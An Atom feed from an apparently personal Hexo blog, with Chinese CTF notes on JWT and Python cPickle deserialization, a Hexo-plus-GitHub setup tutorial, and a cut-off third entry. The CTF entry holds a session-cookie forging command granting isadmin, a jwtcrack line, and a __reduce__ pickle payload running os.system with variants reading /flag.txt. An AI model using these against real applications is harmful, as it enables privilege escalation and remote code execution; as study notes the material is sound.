<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>admire@</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-03-14T10:32:04.936Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>admire@</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JWT</title>
    <link href="http://example.com/2023/03/14/JWT/"/>
    <id>http://example.com/2023/03/14/JWT/</id>
    <published>2023-03-14T10:29:39.000Z</published>
    <updated>2023-03-14T10:32:04.936Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-JSON-Web-Token是什么"><a href="#1-JSON-Web-Token是什么" class="headerlink" title="1. JSON Web Token是什么"></a>1. JSON Web Token是什么</h2><p>JSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。</p><h2 id="2-什么时候你应该用JSON-Web-Tokens"><a href="#2-什么时候你应该用JSON-Web-Tokens" class="headerlink" title="2. 什么时候你应该用JSON Web Tokens"></a>2. 什么时候你应该用JSON Web Tokens</h2><p>下列场景中使用JSON Web Token是很有用的：</p><ul><li><strong>Authorization</strong> (授权) : 这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用。</li><li><strong>Information Exchange</strong> (信息交换) : 对于安全的在各方之间传输信息而言，JSON Web Tokens无疑是一种很好的方式。因为JWTs可以被签名，例如，用公钥&#x2F;私钥对，你可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改。</li></ul><h2 id="3-JSON-Web-Token的结构是什么样的"><a href="#3-JSON-Web-Token的结构是什么样的" class="headerlink" title="3. JSON Web Token的结构是什么样的"></a>3. JSON Web Token的结构是什么样的</h2><img src="/2023/03/14/JWT/874963-20180709124807031-664967381.png" class="" title="img"><p>JSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是：</p><ul><li>Header</li><li>Payload</li><li>Signature</li></ul><p>因此，一个典型的JWT看起来是这个样子的：</p><p>xxxxx.yyyyy.zzzzz</p><p>接下来，具体看一下每一部分：</p><h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>header典型的由两部分组成：token的类型（“JWT”）和算法名称（比如：HMAC SHA256或者RSA等等）。</p><p>例如：</p><img src="/2023/03/14/JWT/874963-20180707143936465-1142974441.png" class="" title="img"><p>然后，用Base64对这个JSON编码就得到JWT的第一部分</p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>JWT的第二部分是payload，它包含声明（要求）。声明是关于实体(通常是用户)和其他数据的声明。声明有三种类型: registered, public 和 private。</p><ul><li>Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。</li><li>Public claims : 可以随意定义。</li><li>Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。</li></ul><p>下面是一个例子：</p><img src="/2023/03/14/JWT/874963-20180707144153274-292205768.png" class="" title="img"><p>对payload进行Base64编码就得到JWT的第二部分</p><p>注意，不要在JWT的payload或header中放置敏感信息，除非它们是加密的。</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><p>为了得到签名部分，你必须有编码过的header、编码过的payload、一个秘钥，签名算法是header中指定的那个，然对它们签名即可。</p><p>例如：</p><p>HMACSHA256(base64UrlEncode(header) + “.” + base64UrlEncode(payload), secret)</p><p>签名是用于验证消息在传递过程中有没有被更改，并且，对于使用私钥签名的token，它还可以验证JWT的发送方是否为它所称的发送方。</p><h2 id="flask-session-cookie-manager使用"><a href="#flask-session-cookie-manager使用" class="headerlink" title="flask_session_cookie_manager使用"></a>flask_session_cookie_manager使用</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&#x27;tanji_is_A_boy_Yooooooooooooooooooooo!&#x27;</span> -t <span class="string">&#x27;&#123;&quot;isadmin&quot;:True&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ &gt; ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">有时候需要添加几个字符达成，猜测为6字符为一组解密为4字符</span><br></pre></td></tr></table></figure><img src="/2023/03/14/JWT/874963-20180707150229764-2037235703.png" class="" title="img"><h2 id="4-JSON-Web-Tokens是如何工作的"><a href="#4-JSON-Web-Tokens是如何工作的" class="headerlink" title="4. JSON Web Tokens是如何工作的"></a>4. JSON Web Tokens是如何工作的</h2><p>在认证的时候，当用户用他们的凭证成功登录以后，一个JSON Web Token将会被返回。此后，token就是用户凭证了，你必须非常小心以防止出现安全问题。一般而言，你保存令牌的时候不应该超过你所需要它的时间。</p><p>无论何时用户想要访问受保护的路由或者资源的时候，用户代理（通常是浏览器）都应该带上JWT，典型的，通常放在Authorization header中，用Bearer schema。</p><p>header应该看起来是这样的：</p><p>Authorization: Bearer <token></p><p>服务器上的受保护的路由将会检查Authorization header中的JWT是否有效，如果有效，则用户可以访问受保护的资源。如果JWT包含足够多的必需的数据，那么就可以减少对某些操作的数据库查询的需要，尽管可能并不总是如此。</p><p>如果token是在授权头（Authorization header）中发送的，那么跨源资源共享(CORS)将不会成为问题，因为它不使用cookie。</p><p>下面这张图显示了如何获取JWT以及使用它来访问APIs或者资源：</p><img src="/2023/03/14/JWT/874963-20180707144719025-1833412608.png" class="" title="img"><ol><li>应用（或者客户端）想授权服务器请求授权。例如，如果用授权码流程的话，就是&#x2F;oauth&#x2F;authorize</li><li>当授权被许可以后，授权服务器返回一个access token给应用</li><li>应用使用access token访问受保护的资源（比如：API）</li></ol><h2 id="5-基于Token的身份认证-与-基于服务器的身份认证"><a href="#5-基于Token的身份认证-与-基于服务器的身份认证" class="headerlink" title="5. 基于Token的身份认证 与 基于服务器的身份认证"></a>5. 基于Token的身份认证 与 基于服务器的身份认证</h2><h3 id="5-1-基于服务器的身份认证"><a href="#5-1-基于服务器的身份认证" class="headerlink" title="5.1. 基于服务器的身份认证"></a>5.1. 基于服务器的身份认证</h3><p>在讨论基于Token的身份认证是如何工作的以及它的好处之前，我们先来看一下以前我们是怎么做的：</p><blockquote><p>HTTP协议是无状态的，也就是说，如果我们已经认证了一个用户，那么他下一次请求的时候，服务器不知道我是谁，我们必须再次认证</p></blockquote><p>传统的做法是将已经认证过的用户信息存储在服务器上，比如Session。用户下次请求的时候带着Session ID，然后服务器以此检查用户是否认证过。</p><p>这种基于服务器的身份认证方式存在一些问题：</p><ul><li>Sessions : 每次用户认证通过以后，服务器需要创建一条记录保存用户信息，通常是在内存中，随着认证通过的用户越来越多，服务器的在这里的开销就会越来越大。</li><li>Scalability : 由于Session是在内存中的，这就带来一些扩展性的问题。</li><li>CORS : 当我们想要扩展我们的应用，让我们的数据被多个移动设备使用时，我们必须考虑跨资源共享问题。当使用AJAX调用从另一个域名下获取资源时，我们可能会遇到禁止请求的问题。</li><li>CSRF : 用户很容易受到CSRF攻击。</li></ul><h3 id="5-2-JWT与Session的差异"><a href="#5-2-JWT与Session的差异" class="headerlink" title="5.2. JWT与Session的差异"></a>5.2. JWT与Session的差异</h3><p>相同点是，它们都是存储用户信息；然而，Session是在服务器端的，而JWT是在客户端的。</p><p>Session方式存储用户信息的最大问题在于要占用大量服务器内存，增加服务器的开销。</p><p>而JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。</p><p>Session的状态是存储在服务器端，客户端只有session id；而Token的状态是存储在客户端。</p><p><em><strong><img src="/2023/03/14/JWT/874963-20180707160150557-1205884800.png" class="" title="img"></strong></em></p><h3 id="5-3-基于Token的身份认证是如何工作的"><a href="#5-3-基于Token的身份认证是如何工作的" class="headerlink" title="5.3. 基于Token的身份认证是如何工作的"></a>5.3. 基于Token的身份认证是如何工作的</h3><p>基于Token的身份认证是无状态的，服务器或者Session中不会存储任何用户信息。</p><blockquote><p>没有会话信息意味着应用程序可以根据需要扩展和添加更多的机器，而不必担心用户登录的位置。</p></blockquote><p>虽然这一实现可能会有所不同，但其主要流程如下：</p><ol><li>用户携带用户名和密码请求访问</li><li>服务器校验用户凭据</li><li>应用提供一个token给客户端</li><li>客户端存储token，并且在随后的每一次请求中都带着它</li><li>服务器校验token并返回数据</li></ol><p>注意：</p><ol><li>每一次请求都需要token</li><li>Token应该放在请求header中</li><li>我们还需要将服务器设置为接受来自所有域的请求，用Access-Control-Allow-Origin: *</li></ol><h3 id="5-4-用Token的好处"><a href="#5-4-用Token的好处" class="headerlink" title="5.4. 用Token的好处"></a>5.4. 用Token的好处</h3><ul><li>无状态和可扩展性：Tokens存储在客户端。完全无状态，可扩展。我们的负载均衡器可以将用户传递到任意服务器，因为在任何地方都没有状态或会话信息。</li><li>安全：Token不是Cookie。（The token, not a cookie.）每次请求的时候Token都会被发送。而且，由于没有Cookie被发送，还有助于防止CSRF攻击。即使在你的实现中将token存储到客户端的Cookie中，这个Cookie也只是一种存储机制，而非身份认证机制。没有基于会话的信息可以操作，因为我们没有会话!</li></ul><blockquote><img src="/2023/03/14/JWT/874963-20180707162551160-1143708148.png" class="" title="img"></blockquote><p>还有一点，token在一段时间以后会过期，这个时候用户需要重新登录。这有助于我们保持安全。还有一个概念叫token撤销，它允许我们根据相同的授权许可使特定的token甚至一组token无效。</p><h3 id="5-5-JWT与OAuth的区别"><a href="#5-5-JWT与OAuth的区别" class="headerlink" title="5.5. JWT与OAuth的区别"></a>5.5. JWT与OAuth的区别</h3><ol><li>OAuth2是一种授权框架 ，JWT是一种认证协议</li><li>无论使用哪种方式切记用HTTPS来保证数据的安全性</li><li>OAuth2用在使用第三方账号登录的情况(比如使用weibo, qq, github登录某个app)，而<strong>JWT是用在前后端分离</strong>, 需要简单的对后台API进行保护时使用。</li></ol><h1 id="（Python）cPickle反序列化漏洞"><a href="#（Python）cPickle反序列化漏洞" class="headerlink" title="（Python）cPickle反序列化漏洞"></a>（Python）cPickle反序列化漏洞</h1><p>基本概念<br>Python中有个库可以实现序列化和反序列化操作，名为pickle或cPickle，作用和PHP的serialize与unserialize一样，两者只是实现的语言不同，一个是纯Python实现、另一个是C实现，函数调用基本相同，但cPickle库的性能更好，因此这里选用cPickle库作为示例。</p><p>cPickle可以对任意一种类型的Python对象进行序列化操作。下面是主要的四个函数：</p><p>cPickle.dump()：将Python对象序列化保存到本地的文件中。</p><p>cPickle.load()：载入本地文件，将文件内容反序列化为Python对象。</p><p>cPickle.dumps()：将Python对象序列化为字符串。</p><p>cPickle.loads()：将字符串反序列化为Python对象。</p><p>简单示例：</p><p>先创建Person类对象并初始化，然后将其序列化并输出，可以看到是C解释过的内容：</p><img src="/2023/03/14/JWT/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NLSV8xMg==,size_16,color_FFFFFF,t_70.png" class="" title="img"><p>为了方便，直接在该代码下面添加反序列化操作：</p><img src="/2023/03/14/JWT/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NLSV8xMg==,size_16,color_FFFFFF,t_70-16604488339323.png" class="" title="img"><p>添加一个__reduce__()魔术方法：反序列化后产生的对象会在结束时触发__reduce__()函数从而触发恶意代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,username,password</span>):</span><br><span class="line">        self.username = username </span><br><span class="line">        self.password = password </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="comment"># 未导入os模块，通用</span></span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system, (<span class="string">&#x27;calc.exe&#x27;</span>,))</span><br><span class="line"><span class="comment"># return eval,(&quot;__import__(&#x27;os&#x27;).system(&#x27;calc.exe&#x27;)&quot;,)</span></span><br><span class="line"><span class="comment"># return map, (__import__(&#x27;os&#x27;).system, (&#x27;calc.exe&#x27;,))</span></span><br><span class="line"><span class="comment"># return map, (__import__(&#x27;os&#x27;).system, [&#x27;calc.exe&#x27;])</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 导入os模块</span></span><br><span class="line">    <span class="comment"># return (os.system, (&#x27;calc.exe&#x27;,))</span></span><br><span class="line">    <span class="comment"># return eval, (&quot;os.system(&#x27;calc.exe&#x27;)&quot;,)</span></span><br><span class="line">    <span class="comment"># return map, (os.system, (&#x27;calc.exe&#x27;,))</span></span><br><span class="line">    <span class="comment"># return map, (os.system, [&#x27;calc.exe&#x27;])</span></span><br><span class="line">    其他</span><br><span class="line">    <span class="comment"># return (commands.getoutput, (&#x27;cat /flag.txt&#x27;,))</span></span><br></pre></td></tr></table></figure><p>admin &#x3D; Person(‘admin’,’123456’)<br>result &#x3D; cPickle.dumps(admin)</p><p>user &#x3D; cPickle.loads(result)</p><h1 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h1><p>1、用更高级的接口__getnewargs()、<strong>getstate</strong>()、<strong>setstate</strong>()等代替__reduce__()魔术方法；</p><p>2、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。</p><p>&#x2F;change?name&#x3D;bmV3X3Jvb2tpZQ&#x3D;&#x3D;&amp;newname&#x3D;bmV3X3Jvb2tpZQpzVmlkCkkwCnNiLg&#x3D;&#x3D;</p><p>&#x2F;dacaiji?name&#x3D;new_rookie</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-JSON-Web-Token是什么&quot;&gt;&lt;a href=&quot;#1-JSON-Web-Token是什么&quot; class=&quot;headerlink&quot; title=&quot;1. JSON Web Token是什么&quot;&gt;&lt;/a&gt;1. JSON Web Token是什么&lt;/h2&gt;&lt;p&gt;</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="JWT" scheme="http://example.com/tags/JWT/"/>
    
  </entry>
  
  <entry>
    <title>hexo+github搭建博客</title>
    <link href="http://example.com/2023/03/13/hexo-github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    <id>http://example.com/2023/03/13/hexo-github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</id>
    <published>2023-03-13T15:06:46.000Z</published>
    <updated>2023-03-14T10:35:41.743Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><ol><li>GitHub账号<br>需要有一个GitHub账号，没有的话到 官网 申请一个。<br>注册很简单，不懂的话可以参考 GitHub申请账号</li><li>安装Git<br> 在自己电脑上安装好Git，hexo部署到GitHub时要用。<br> 网上找篇教程</li><li>安装NodeJS<br>在自己电脑上安装好NodeJS，Hexo是基于NodeJS编写的，所以需要安装NodeJS和npm工具。<br>网上找篇教程</li></ol><h1 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h1><p>我们采用Hexo来创建我们的博客网站，Hexo 是一个基于NodeJS的静态博客网站生成器，使用Hexo不需开发，只要进行一些必要的配置即可生成一个个性化的博客网站，非常方便。点击进入 官网。</p><p>安装 Hexo</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>查看版本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure><p>创建一个项目 hexo-blog 并初始化</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init hexo-blog</span><br><span class="line"><span class="built_in">cd</span> hexo-blog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>本地启动</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure><p>浏览器访问 <a href="http://localhost:4000，页面默认主图风格如下">http://localhost:4000，页面默认主图风格如下</a></p><img src="/2023/03/13/hexo-github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/image-20230313232222727.png" class="" title="image-20230313232222727"><h1 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h1><p>在<code>GitHub</code>上创建一个新的代码仓库用于保存我们的网页。</p><p>点击<code>Your repositories</code>，进入仓库页面。</p><p>点击<code>New</code>按钮，进入仓库创建页面。</p><p>填写仓库名，格式必须为<code>&lt;用户名&gt;.github.io</code>，然后点击<code>Create repository</code>。</p><p>点击<code>creating a new file</code>创建一个新文件，作为我们网站的主页。</p><h1 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h1><p>4.1生成SSH添加到GitHub</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;yourname&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;youremail&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的yourname输入你的GitHub用户名，youremail输入你GitHub的邮箱。这样GitHub才能知道你是不是对应它的账户。</p><p>可以用以下两条，检查一下你有没有输对</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config user.name</span><br><span class="line">git config user.email</span><br></pre></td></tr></table></figure><p>然后创建SSH,一路回车</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;youremail&quot;</span></span><br></pre></td></tr></table></figure><p>在gitbash中，查看是否成功</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>如果失败更改端口</p><p>操作方法：</p><p>进入~&#x2F;.ssh下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure><p>创建一个config文件(这里我用的vim编辑器)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim config</span><br></pre></td></tr></table></figure><p>编辑文件内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User git</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>保存退出<br>检查是否成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><h1 id="将hexo部署到GitHub"><a href="#将hexo部署到GitHub" class="headerlink" title="将hexo部署到GitHub"></a>将hexo部署到GitHub</h1><p>这个时候需要先安装deploy-git ，也就是部署的命令,这样你才能用命令部署到GitHub。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>这一步，我们就可以将hexo和GitHub关联起来，也就是将hexo生成的文章部署到GitHub上，打开站点配置文件 _config.yml，翻到最后，修改为<br>YourgithubName就是你的GitHub账户</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo: https://github.com/YourgithubName/YourgithubName.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>启动连接失败</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="模板导入"><a href="#模板导入" class="headerlink" title="模板导入"></a>模板导入</h1><p>在hexo项目根目录下执行操作clone主题</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p>如果沒有 pug 以及 <a href="https://so.csdn.net/so/search?q=stylus&spm=1001.2101.3001.7020">stylus</a> 的渲染器，还需要下载，否则在项目运行时会报错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p>3、修改项目根目录下的_config.yml文件（称为站点配置文件），开启主题</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#theme: landscape</span></span><br><span class="line">theme: butterfly</span><br></pre></td></tr></table></figure><p>若出现乱码</p><p>原因是<a href="https://so.csdn.net/so/search?q=hexo&spm=1001.2101.3001.7020">hexo</a>在5.0之后把swig给删除了需要自己手动安装</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i hexo-renderer-swig</span><br></pre></td></tr></table></figure><h2 id="解决：hexo-github本地和线上图片不显示问题"><a href="#解决：hexo-github本地和线上图片不显示问题" class="headerlink" title="解决：hexo+github本地和线上图片不显示问题"></a>解决：hexo+github本地和线上图片不显示问题</h2><p>在搭载好hexo(butterfly)+github博客后（有道云笔记记录），新建博客无法图片问题，多方寻找网上的解决办法仍未解决，大多安装了hexo-asset-image插件来解决，但是本人多项测试后，均为无效，唯一有效的需要将图片格式转换为这样，但是以一个一个去转换非常麻烦，因此继续寻求解决办法，最终找到如下帖子：<a href="https://moeci.com/posts/hexo-typora/%EF%BC%8C%E8%BF%99%E4%BD%8D%E5%A4%A7%E4%BD%AC%E5%BC%80%E5%8F%91%E7%9A%84%E6%8F%92%E4%BB%B6%E6%98%AFhexo-asset-img%EF%BC%8C%E8%80%8C%E9%9D%9Ehexo-asset-image%EF%BC%8C%E7%BB%8F%E8%BF%87%E6%B5%8B%E8%AF%95%EF%BC%8C%E6%9C%89%E6%95%88">https://moeci.com/posts/hexo-typora/，这位大佬开发的插件是hexo-asset-img，而非hexo-asset-image，经过测试，有效</a></p><p>1配置 <a href="https://so.csdn.net/so/search?q=Typora&spm=1001.2101.3001.7020">Typora</a> 偏好设置，如下图更改，此操作将图片文件保存路径: .&#x2F;${filename} 即保存到与 当前正在编辑的文件名相同的同级文件夹下。</p><img src="/2023/03/13/hexo-github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/image-20230313233951219.png" class="" title="image-20230313233951219"><p>修改_config.yml中的post_asset_folder，false 改为 true，这样修改后，每次 ‘hexo new page’ 生成新文章，都会在文章文件同级目录创建一个与文章文件名同名的文件夹，我们就在这里存放此文章的图片。</p><p>安装插件hexo-asset-img：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-asset-img --save</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure><p>完成安装</p><h2 id="导航栏"><a href="#导航栏" class="headerlink" title="导航栏"></a>导航栏</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">hexo new page <span class="string">&quot;about&quot;</span></span><br><span class="line">hexo new page <span class="string">&quot;tags&quot;</span></span><br><span class="line">hexo new page <span class="string">&quot;categories&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">title: about</span><br><span class="line"><span class="built_in">date</span>: 2019-06-25 19:16:17</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;about&quot;</span></span><br><span class="line">---</span><br><span class="line"> </span><br><span class="line">---</span><br><span class="line">title: about</span><br><span class="line"><span class="built_in">date</span>: 2019-06-25 19:16:17</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;tags&quot;</span></span><br><span class="line">---</span><br><span class="line"> </span><br><span class="line">---</span><br><span class="line">title: about</span><br><span class="line"><span class="built_in">date</span>: 2019-06-25 19:16:17</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;categories&quot;</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a><strong>常用命令</strong></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">hexo new “name”       <span class="comment"># 新建文章</span></span><br><span class="line"></span><br><span class="line">hexo new page “name”  <span class="comment"># 新建页面</span></span><br><span class="line"></span><br><span class="line">hexo g                <span class="comment"># 生成页面</span></span><br><span class="line"></span><br><span class="line">hexo d                <span class="comment"># 部署</span></span><br><span class="line"></span><br><span class="line">hexo g -d             <span class="comment"># 生成页面并部署</span></span><br><span class="line"></span><br><span class="line">hexo s                <span class="comment"># 本地预览</span></span><br><span class="line"></span><br><span class="line">hexo clean            <span class="comment"># 清除缓存和已生成的静态文件</span></span><br><span class="line"></span><br><span class="line">hexo <span class="built_in">help</span>             <span class="comment"># 帮助</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;GitHub账号&lt;br&gt;需要有一个GitHub账号，没有的话到 官网 申请一个。&lt;br&gt;注册很简单，不懂的话可以</summary>
      
    
    
    
    <category term="Others" scheme="http://example.com/categories/Others/"/>
    
    
    <category term="建站" scheme="http://example.com/tags/%E5%BB%BA%E7%AB%99/"/>
    
  </entry>
  
  <entry>
    <title>re匹配规则</title>
    <link href="http://example.com/2023/03/13/re%E5%8C%B9%E9%85%8D%E8%A7%84%E5%88%99/"/>
    <id>http://example.com/2023/03/13/re%E5%8C%B9%E9%85%8D%E8%A7%84%E5%88%99/</id>
    <published>2023-03-13T13:46:22.000Z</published>
